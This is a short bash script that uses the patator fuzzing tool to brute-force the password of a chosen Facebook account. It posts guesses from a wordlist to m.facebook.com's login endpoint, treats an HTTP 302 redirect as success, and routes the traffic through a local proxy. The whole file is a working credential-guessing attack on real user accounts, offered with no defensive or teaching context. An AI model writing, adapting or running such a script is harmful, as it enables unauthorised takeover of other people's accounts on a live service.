#!/bin/bash
#export HYDRA_PROXY_HTTP=http://127.0.0.1:8123
patator http_fuzz url=https://m.facebook.com/login.php?login_attempt=1 method=POST body='email=_@@_'$1'_@@_&pass=_@@_FILE0_@@_&login=_@@_Log In_@@_' 0=$2 -x quit:mesg='HTTP/1.1 302 Found' -e _@@_:url http_proxy=127.0.0.1:8123
